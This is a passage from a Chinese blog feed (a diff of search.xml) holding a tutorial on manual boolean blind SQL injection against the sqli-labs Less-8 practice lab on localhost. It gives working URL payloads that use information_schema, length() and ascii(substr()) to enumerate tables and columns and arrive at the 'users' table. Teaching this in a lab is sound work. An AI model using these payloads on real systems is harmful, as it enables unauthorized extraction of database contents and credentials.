+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" data-fancybox="default" data-caption="有提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="有提示文字"></a><span class="image-caption">有提示文字</span></div></div>
+
+<p>接着我们尝试破坏查询，在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>猜测对应的后端SQL语句为：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现页面显示如下：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" data-fancybox="default" data-caption="无提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="无提示文字"></a><span class="image-caption">无提示文字</span></div></div>
+
+<p>观察上图我们可以发现，<code>You are in...</code>这段话不见了，说明这段查询语句是有问题的，即我们破坏查询成功了。但是页面没有回显报错信息，说明我们之前用的显注方法失效了。这时我们便要用到布尔盲注了。</p>
+<p>接着我们就继续判断我们传入的参数在后端是如何被封装的。<br>在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost:81/sqli/Less-8/?id=1' and 1=1 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现那段文字<code>You are in...</code>（后文称提示文字）又重新出现了，这证明：(i)参数是由单引号封装的；(ii)后端对1=1进行了判断并返回TRUE，可以进行布尔盲注。<br>因此推翻之前的SQL语句猜测，此处后端SQL语句形如：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+</div><div class="story post-story"><h2 id="布尔盲注思路"><a href="#布尔盲注思路" class="headerlink" title="布尔盲注思路"></a>布尔盲注思路</h2><p>确认能够进行布尔盲注后，我们需要想办法获取我们想要的数据。通常会编写脚本来自动进行布尔盲注，但本文重点在于厘清布尔盲注的原理和实现路线，因此采用手动注入的方法。</p>
+<p>首先，我们需要知道当前数据库有哪些表、各自的名称，并判断哪些表含有重要信息；接着，我们需要知道表里有哪些字段、各自的名称，并判断哪些字段含有重要信息；最后我们获取到相应字段对应的每一条记录。</p>
+<p>这个由大及小的思路与之前的盲注并无差别，唯一不同的是这次我们不会直接看到查询的结果，而需要通过逻辑表达式和关系表达式是否返回为TRUE来猜解我们想要得到的信息。在布尔盲注的过程中，由于表中数据的不确定性，如果我们想要通过枚举出查询结果所有可能的值，这个工作量是非常大的。因此，我的方法是先确定数据库中表的数量，再确定每一个表的名称。确定表名时，先得到查询结果的字符串长度区间，再确定字符串长度，先确定每一个字符的ASCII码区间，再确定每一个字符的确切ASCII码。如果你有点迷糊了，没有关系，请接着往下看。</p>
+</div><div class="story post-story"><h2 id="确定数据库中表的数量"><a href="#确定数据库中表的数量" class="headerlink" title="确定数据库中表的数量"></a>确定数据库中表的数量</h2><p>我采用的方法是：让后端判断第n个表的字符串长度是否大于0，如果提示文字出现，则证明数据库有第n个表，否则证明数据库中最多有n-1个表。</p>
+<p>在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>后端SQL语句形如：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> (length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>这段语句的意思为：从数据库的表名中查询id=’1’的所有字段并且当前数据库中的第4个表名字符串长度大于0。其中length()函数作用是取查询结果的字符串长度，用法为length(字符串)。如果你忘了这句语句中其他地方的含义，请见<a href="../sqli2/">上一章</a>。<br>结果，页面显示了提示文字。表明当前数据库至少有4张表。<br>接着我们将地址栏中的字符改为</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 4,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>作用是判断第5个表的字符串长度是否大于0，换言之，第5张表是否存在。<br>结果发现页面并没有显示提示文字。<br>由此，我们得到结论：当前数据库中有且仅有4张表。</p>
+</div><div class="story post-story"><h2 id="确定表名的字符串长度"><a href="#确定表名的字符串长度" class="headerlink" title="确定表名的字符串长度"></a>确定表名的字符串长度</h2><p>我们首先确定第一张表的字符串长度，用到的方法与上一小节类似。<br>在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>作用是判断第一张表表名的字符串长度是否大于5。<br>结果页面显示提示文字，证明第一张表表名的字符串长度大于5。<br>接着我们将5改成6，发现页面不显示提示文字了。答案也就出来了，第一张表表名的字符串长度为6。用同样的方法我们也可以获取其他表名的字符串长度。</p>
+</div><div class="story post-story"><h2 id="确定表名的每一个字符所对应的ASCII码值"><a href="#确定表名的每一个字符所对应的ASCII码值" class="headerlink" title="确定表名的每一个字符所对应的ASCII码值"></a>确定表名的每一个字符所对应的ASCII码值</h2><p>在确定了每张表表名的字符串长度之后，我们就需要确定其每一个字符的具体值。但是表名有可能是字母、数字、标点符号、操作符、特殊字符等，倘若我们一个个尝试，效率会很低。因此我们会想到用ASCII码值来判断字符的具体值。每一个ASCII码对应一个字符，主要对应关系如下图：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" data-fancybox="default" data-caption="ASCII码对应表"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ASCII码对应表"></a><span class="image-caption">ASCII码对应表</span></div></div>
+
+<p>我们这里以第四张表为例（问就是第四张表重要），在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) &gt; 96 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其中，substr()函数作用为截取字符串中指定位置开始的指定个字符，用法为：substr(字符串,起始位置,截取长度)，起始位置从1开始。ascii()函数作用为取字符的ASCII码值，用法为ascii(字符)。因此上述语句作用为判断第4张表表名的第一个字符ASCII码值是否大于96。<br>结果发现页面显示提示文字，证明第4张表表名的第一个字符ASCII码值大于96，因此很大概率它是一个小写的英文字母。可以将<code>&gt; 96</code>改为<code>&lt; 123</code>尝试一下，发现的确如此。</p>
+<p>接着可以采用二分法来确定该字符的具体值。将<code>&lt; 123</code>改为<code>&gt; 110</code>发现页面显示提示文字，因此将111和122作为两个端点继续划分。将<code>&gt; 110</code>改为<code>&lt; 117</code>发现页面不显示提示文字。因此可以确定该字符为u,v,w,x,y,z中的一个，继续二分法或者枚举都可以得到：该字符为u。</p>
+<p>利用同样的方法，我们猜解得到第四张表的表名为<strong>users</strong>。同样地，我们也能够猜解出其他表名。</p>
+</div><div class="story post-story"><h2 id="确定表中字段数"><a href="#确定表中字段数" class="headerlink" title="确定表中字段数"></a>确定表中字段数</h2><p>与确定数据库中表数量的方法一致，只需将<code>table_name</code>替换为<code>column_name</code>，<code>information_schema.tables</code>替换为<code>information_schema.columns</code>，<code>table_schema=database()</code>替换为<code>table_name='users'</code>即可。如：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现页面显示提示文字，证明users表中至少有4个字段。利用和上文一样的方法，最终可以知道users表中有6个字段。</p>
+</div><div class="story post-story"><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>确定字段的字符串长度，确定字段的每个字符具体值；确定记录数，确定记录的字符串长度，确定记录的每个字符具体值。方法与前文完全一致。有兴趣的小伙伴可以尝试一下继续手动猜解。</p>
+</div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本文主要目的是为读者厘清布尔盲注的原理和思路，实际上，手动进行布尔盲注效率十分低下，几乎用不到。但如果时间充裕，可以感受一下手动进行布尔盲注的过程，私以为这有助于更清晰地认识布尔盲注。</p>
+
+</div>]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
 </search>
